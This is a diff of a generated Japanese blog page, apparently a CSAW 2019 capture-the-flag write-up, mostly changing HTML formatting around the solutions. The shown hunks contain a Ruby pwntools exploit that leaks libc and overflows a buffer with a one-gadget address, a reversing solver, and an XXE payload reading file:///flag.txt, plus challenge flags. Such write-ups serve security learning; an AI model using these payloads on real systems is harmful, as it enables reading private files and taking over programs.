@@ -19,7 +19,7 @@
   
   <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=">
   
-  <meta name="generator" content="Hugo 0.59.1" />
+  <meta name="generator" content="Hugo 0.53" />
 </head>
 <body>
   <nav class="u-background">
@@ -98,8 +98,8 @@ libc <span style="color:#666">=</span> <span style="color:#800">ELF</span><span 
 z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)
 libc_printf <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil(<span style="color:#ba2121">&#34;</span><span style="color:#b62;font-weight:bold">\n</span><span style="color:#ba2121">&#34;</span>)<span style="color:#666">.</span>match(<span style="color:#b68">/: (.+)/</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
 libc_base <span style="color:#666">=</span> libc_printf <span style="color:#666">-</span> libc<span style="color:#666">.</span>symbols<span style="color:#666">[</span><span style="color:#ba2121">&#34;printf&#34;</span><span style="color:#666">]</span>
-<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;%x&#34;</span> <span style="color:#666">%</span> libc_base
-payload <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
+<span style="color:#008000">puts</span> <span style="color:#ba2121">&#34;%x&#34;</span> <span style="color:#008000">% libc_base
+</span><span style="color:#008000">payload </span> <span style="color:#666">=</span> <span style="color:#ba2121">&#34;A&#34;</span> <span style="color:#666">*</span> <span style="color:#666">40</span>
 payload <span style="color:#666">&lt;&lt;</span> p64(libc_base <span style="color:#666">+</span> <span style="color:#666">0x4f322</span>)
 z<span style="color:#666">.</span>sendline(payload)
 z<span style="color:#666">.</span>interact</code></pre></div></li>
@@ -232,7 +232,8 @@ change(<span style="color:#666">-</span><span style="color:#666">50</span>, p64(
 <h3 id="beleaf">Beleaf</h3>
 
 <ul>
-<li><p>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</p>
+<li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
+</ul>
 <div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
 
 idxs <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x1</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x27</span>, <span style="color:#666">0x02</span>, <span style="color:#666">0x00</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x03</span>, <span style="color:#666">0x8</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x13</span>, <span style="color:#666">0x4</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x5</span>, <span style="color:#666">0x15</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0x16</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x6</span><span style="color:#666">]</span>
@@ -240,10 +241,10 @@ idxs <span style="color:#666">=</span> <span style="color:#666">[</span><span st
 flag <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x77</span>, <span style="color:#666">0x66</span>, <span style="color:#666">0x7b</span>, <span style="color:#666">0x5f</span>, <span style="color:#666">0x6e</span>, <span style="color:#666">0x79</span>, <span style="color:#666">0x7d</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x62</span>, <span style="color:#666">0x6c</span>, <span style="color:#666">0x72</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x61</span>, <span style="color:#666">0x65</span>, <span style="color:#666">0x69</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x6f</span>, <span style="color:#666">0x74</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x67</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x75</span><span style="color:#666">].</span>map(<span style="color:#666">&amp;</span><span style="color:#19177c">:chr</span>)
 
 idxs<span style="color:#666">.</span>each <span style="color:#008000;font-weight:bold">do</span> <span style="color:#666">|</span>i<span style="color:#666">|</span>
-<span style="color:#008000">print</span> flag<span style="color:#666">[</span>i<span style="color:#666">]</span>
-<span style="color:#008000;font-weight:bold">end</span></code></pre></div></li>
-
-<li><p><strong>flag{we_beleaf_in_your_re_future}</strong></p></li>
+  <span style="color:#008000">print</span> flag<span style="color:#666">[</span>i<span style="color:#666">]</span>
+<span style="color:#008000;font-weight:bold">end</span></code></pre></div>
+<ul>
+<li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
 </ul>
 
 <h2 id="web">Web</h2>
@@ -280,24 +281,24 @@ idxs<span style="color:#666">.</span>each <span style="color:#008000;font-weight
 <ul>
 <li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
 </ul></li>
-
-<li><p><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする</p>
-<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#bc7a00">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
-<span style="color:#bc7a00">&lt;!DOCTYPE root[
-</span><span style="color:#bc7a00">&lt;!ENTITY pass SYSTEM &#34;file:///flag.txt&#34;&gt;</span>
+<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする
+<code>xml
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
 ]&gt;
-<span style="color:#008000;font-weight:bold">&lt;users&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;user&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;username&gt;</span>alice2<span style="color:#008000;font-weight:bold">&lt;/username&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;password&gt;</span>passwd1<span style="color:#008000;font-weight:bold">&lt;/password&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;name&gt;</span>Alice2<span style="color:#008000;font-weight:bold">&lt;/name&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;email&gt;</span>alice2@fakesite.com<span style="color:#008000;font-weight:bold">&lt;/email&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;group&gt;</span>CSAW2019<span style="color:#008000;font-weight:bold">&lt;/group&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;intro&gt;</span><span style="color:#999;font-weight:bold">&amp;pass;</span><span style="color:#008000;font-weight:bold">&lt;/intro&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;/user&gt;</span>
-<span style="color:#008000;font-weight:bold">&lt;/users&gt;</span></code></pre></div></li>
-
-<li><p><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></p></li>
+&lt;users&gt;
+&lt;user&gt;
+&lt;username&gt;alice2&lt;/username&gt;
+&lt;password&gt;passwd1&lt;/password&gt;
+&lt;name&gt;Alice2&lt;/name&gt;
+&lt;email&gt;alice2@fakesite.com&lt;/email&gt;
+&lt;group&gt;CSAW2019&lt;/group&gt;
+&lt;intro&gt;&amp;pass;&lt;/intro&gt;
+&lt;/user&gt;
+&lt;/users&gt;
+</code></li>
+<li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
 </ul>
 
   
